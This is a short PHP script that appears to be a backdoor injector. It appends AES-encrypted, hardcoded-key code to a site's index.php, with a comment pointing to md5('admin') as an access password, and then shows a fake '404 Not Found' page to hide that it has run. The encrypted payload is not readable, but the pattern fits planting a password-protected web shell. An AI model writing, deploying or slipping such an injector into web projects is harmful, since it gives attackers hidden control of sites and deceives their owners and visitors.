
<?php
$ar = base64_decode("aW5kZXgucGhw");
$arr = explode('|',$ar);
foreach($arr as $k => $inject_php){
//  1 is md5('admin'). You can have on your own.
 
   file_put_contents($inject_php, openssl_decrypt("7j7fXo3SPpB52iSMMspQxQ==", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
    file_put_contents($inject_php,openssl_decrypt("sxi4WLMRLAPLWLVQC3nZfhU1ps6Euf++bMzxICxR8cDnChpAcMJv4Uoa+QpauvoO+SKfdj9UWAGb/eUjE1tUOO5JwQbN7CjRp3/tkaLQf5aIZn3lLB8H8eLghAzX7mI3ZXtEWWjw1LhpExTXi0E8Ws5wPNN+3cRuFEcXy/o/lRq4206gKGFIhauRz1AY02zwT8tPfCObpw6OO+06kYrkHk1vTIOEQJndwuuhMnBC0ZvtTgLQAGmlF/JZXyrai6WWpuCz8p1U7HjG7Dt9ynv8QpEY9yfZHm9GCAWVlzBz+ZpdDlz3/UC9ojNYDwd0KGJE8OZ/u5WasbLhTT6Yll9ccYK39c0Hd9UGdBISA/3U8QaNgoyzfRgNL0XjLXtCaq9Y6dMSTKcD2bbnByA5Jwcd79f/FYiQ+qWVj/DvtBSFH90+Mg7FHp4uU/CA/S0L4gVvAkK0tx8AzikjRJkkx9+DasmmdqZM6qA8YoROqL7IRSFdAClq1bJaM0QUYFIFHizHUb8MYADwTQV1TpZ/L4mV9cHg5FwRxCqKYRVvZA/ZiXuLTUU7Txakz2fXYadP64+hoyBqGK2qRmlFU/LuyhzO2haBZHGiPzE+bVdhri1+MCfSw9UPb2Z6oum4GczFtWuNpCNrZruGBV8EEnEsrotJmWfQkjv5UA278aXz05CkTwx4/9ELQtdaDt/fznXJ1PwVQufHP3QKPRMRlnTZHALNWv+z3rjIhtzT8oRM7L5QKsm8nHssxq39shMq4hUiwdVSrmmWb3yi0ugm2Cg9gWhzQApEwjW82Fg0in2PChp8wxTBoa8nODSF/WZjJ9w7xee1FnCahv7TvpNa60uSqx69m6jjKlrvsEOaK7T3p0I2iNBXgQTMyJsr6aMpYXmqcmDSgVxQcsQOGlfnEN8Q7kGTVNEYwiGENa2DtWpa8hqshqo/4bSbYA67wr6sVno+LGDuWL5Hp8gxAKer3Tmv8SVgivf/qZKLsc7r90NfzTpBfbWYMDqikcwa3BMoJ8H83eetfvz2GU501t/LHH94ZP2kC+mOzWSEqtH7pvYcpqTojofho9NlyJvH4mh2eC7AE0AGXXR3GeV10IKGbHcjYuFbQAp4xrNCs/t69KQuCN8qrRcBZhQaoXcYxIR3/eGB9LiOBZupiLfcBJcMMfU14YqfiPS4RXTI0Dpp6N8dhfWVj5dJaJ64q44th3mZjtKAZcbpJLD46l6W0WIdjt4BxlrwH0kndEg3rP1PFnA2DS383krWl9kLDNzgfZrmw/R5aYko24IHvXGEBmyrFwBliRm8tPT7a0w2QqGYwqzj7QlZTisMzWq0+dP+CI3St0qu5LBBPOoU0OjC4c9GSFu0uRAM0BL1Oy2DGsihBa9sr1yfqQ8eWjMZ4UA0vCxjqYh/0OBczyYF1hDfTvXRKuvXW6Spyc9ThhCi/cKau2722rxlfCo=", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
    file_put_contents($inject_php,openssl_decrypt("/cCTgZzc0/7TcTzQM0lDMQ==", "AES-128-ECB", "b521caa6e1db82e5"),FILE_APPEND);
    echo '<title>Error 404!!1</title><p>404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>

